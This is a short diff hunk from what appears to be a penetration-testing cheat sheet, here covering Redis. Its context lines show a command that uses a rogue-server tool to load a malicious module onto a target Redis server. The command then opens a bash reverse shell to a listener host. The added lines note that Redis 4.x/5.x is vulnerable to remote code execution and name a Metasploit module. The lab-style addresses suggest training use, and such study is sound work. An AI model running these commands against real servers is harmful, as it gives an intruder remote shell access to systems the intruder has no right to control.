@@ -883,6 +883,9 @@ python redis.py 10.10.10.160 redis
 https://github.com/vulhub/redis-rogue-getshell.git
 sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.89/8080 0>&1'"
 
+Vulnerable versions to RCE: 4.x/5.x
+Metasploit: linux/redis/redis_rce
+
 ```
 
 ## MsDeploy - 8172
